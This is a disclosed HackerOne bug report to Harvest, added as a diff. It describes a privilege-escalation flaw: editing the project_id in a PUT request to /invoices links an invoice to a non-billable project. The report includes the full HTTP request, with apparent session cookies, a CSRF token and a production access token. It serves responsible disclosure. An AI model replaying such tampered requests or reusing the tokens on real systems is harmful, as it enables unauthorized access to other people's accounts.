@@ -1,0 +1,42 @@
+ReportLink:https://hackerone.com/reports/176899
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/bugdiscloseguys
+ReportedTo:Harvest(harvest)
+BountyAmount:100.0
+Severity:none
+State:Closed
+DateOfDisclosure:26.11.2016 16:28:27
+
+Summary:
+
+Hey there,
+I found out that invited user to a project cannot edit the project settings unless he is a PROJECT MANAGER on it.
+Now there is an option while editing project to make it BILLABLE OR NOT... 
+When it is NOT billable it is quite impossible to BILL an invoice for it without making it billable.
+
+Now i found that while LINKING invoice if we change the project ID to that PROJECT ID the invoice will be linked.
+
+```
+PUT /invoices/10878022 HTTP/1.1
+Host: hshteam.harvestapp.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://hshteam.harvestapp.com/
+X-CSRF-Token: Y0J88vpZaPduF9TaqfFubvxJk0rPjRFhiOiaGbKdzoLQoJ7Hucsc9JrJNv+P1UcbmjDTypnrN5CeRjxcmhgdkw==
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 35
+Cookie: _harvest_sess=dnlFLzVyTVlHNTNidXRRTFVsT1JENk5aYkVHUlZKTjR1QXU4Z1FhdkJNRVhiVUo3Sll3NUhmdWRCZFFBNVhGMlA5QnhocnRtTHVHZTVOVDdZY3hZRGdoL2p6MGdvZzk0K2lLMkJaeGVMNnVFdFZza2NKcUpTSDhQUUE1RU03TGxXd2lNM2xoWDVOdStMVys5SVVBUk9SWG1kMGlQa0hTQ2RHQlBCQmlCWk14UTJkMzVFL052QS9KdE11RTRHajExdVl3alI5b0Q1by9tMk5VYno5KzdHdz09LS1aRmVhbGtic3Y0aVVmK0ZvazZLVGJBPT0%3D--3fde05f05bca3a4c3e367412ece61e23429f058d; km_ai=6tr3UOYayu5Nkh2XDJ6BBglhJco%3D; km_uq=; km_lv=x; removed_from_remarketing=true; _ga=GA1.3.637014398.1476064502; __utma=186612656.637014398.1476064502.1476075769.1476075769.1; __utmz=186612656.1476075769.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); production_access_token=eEwvTU0yTTdyRWtHZzUxaHZkUzVsYThKc2lIdkJraHJUOE0yRHE3UFVWcTllMWVRY0dwVzJwalFUc3kzdDl0azREN2RoemZEVTlIYVplRUhVOEVoazFVSmZsOFcvVElRaUV2KzZmaGY0Y01VNVVvQmFIWXZ5TWlFNEFSUnI2bk9Lcm5ENW54UTJiaVAyTzE5NDZOY0pBPT0tLSs4VzAxVmpkOXVRTHhVWHlLUXBJdWc9PQ%3D%3D--918a61031ebba3267e193c162c06bf39ff4503d1; _gat_UA-103886-9=1
+Connection: keep-alive
+
+{"invoice":{"project_id":12019475}}
+```
+
+Now the admin can UNLINK the invoice , neither can make project changes like change of client for a project,changing INVOICE method.
+
+Please Let me know about it.
+
+Thanks.
+God is great <3
